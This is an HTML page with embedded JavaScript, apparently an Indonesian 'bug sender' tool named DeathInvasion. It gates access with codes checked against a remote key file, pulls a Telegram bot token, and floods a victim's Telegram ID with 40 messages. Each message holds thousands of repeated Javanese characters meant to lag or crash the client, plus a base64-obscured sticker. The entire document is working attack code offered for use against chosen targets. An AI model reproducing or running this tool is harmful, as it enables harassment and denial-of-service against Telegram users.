<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>DeathInvasion Sender</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #111;
      color: #0f0;
      text-align: center;
      padding: 40px;
    }
    input, button {
      padding: 10px;
      font-size: 1rem;
      margin: 10px;
      width: 250px;
    }
    button {
      cursor: pointer;
      background: #0f0;
      border: none;
      color: #000;
    }
    #main, #target-section {
      display: none;
    }
    #progress-text {
      margin-top: 10px;
      font-size: 1rem;
      color: #0f0;
    }
  </style>
</head>
<body>

  <h1>üíÄ DeathInvasion Login</h1>

  <div id="login">
    <input type="text" id="code-token" placeholder="Masukkan kode akses"><br>
    <button onclick="verifyCode()">üîì Masuk</button>
  </div>

  <div id="main">
    <h2>üí• Sender Aktif</h2>
    <div id="target-section">
      <input type="text" id="target-id" placeholder="ID Telegram Target"><br>
      <button onclick="sendBug()">üöÄ Kirim Bug</button>
      <p id="progress-text"></p> <!-- Progress di sini -->
    </div>
  </div>

  <script>
    let BOT_TOKEN = "";

    async function verifyCode() {
      const code = document.getElementById('code-token').value.trim();
      if (!code) return alert("Masukkan kode dulu üòπ");

      try {
        const response = await fetch("https://raw.githubusercontent.com/BimxyzDev/Deathinvasion/main/key-folder/key.json");
        const data = await response.json();

        const entry = data.find(item => item.code === code);
        if (!entry) return alert("‚ùå Kode salah!");

        BOT_TOKEN = entry.token;

        // Tampilkan UI setelah login
        document.getElementById('login').style.display = "none";
        document.getElementById('main').style.display = "block";
        document.getElementById('target-section').style.display = "block";
      } catch (err) {
        console.error(err);
        alert("‚ùå Gagal memverifikasi kode");
      }
    }

    async function sendBug() {
      const id = document.getElementById('target-id').value.trim();
      if (!id) return alert("Isi ID dulu üòπ");

      const stickerId = atob("Q0FBQ0FnVUFBeGtCQUFFTzJJSm9aaWQyQ1JoN1FFS1lVX1l1V1hSc01adng3QUFDN2dnQUFpRmN1Vlo4eV9DOXFsUWFtVFlF");
      const progressText = document.getElementById('progress-text');

      for (let i = 1; i <= 40; i++) {
        const payload = {
          chat_id: id,
          text: `üí£ *DEATH INVASION [${i}/10]* üí£\n` + "Í¶æ".repeat(4000),
          parse_mode: "Markdown"
        };

        const stickerPayload = {
          chat_id: id,
          sticker: stickerId
        };

        try {
          // Kirim teks
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          // Kirim stiker
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendSticker`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(stickerPayload)
          });

          const percent = Math.round((i / 40) * 100);
          progressText.textContent = `Mengirim bug: ${percent}%`;

          console.log(`‚úÖ Batch ${i} terkirim`);
          await new Promise(res => setTimeout(res, 100));
        } catch (err) {
          console.error(`‚ùå Gagal kirim ${i}:`, err);
        }
      }

      progressText.textContent = "‚úÖ Semua bug + stiker berhasil dikirim!";
      alert("‚úÖ Semua bug + stiker berhasil dikirim!");
    }
  </script>

</body>
</html>
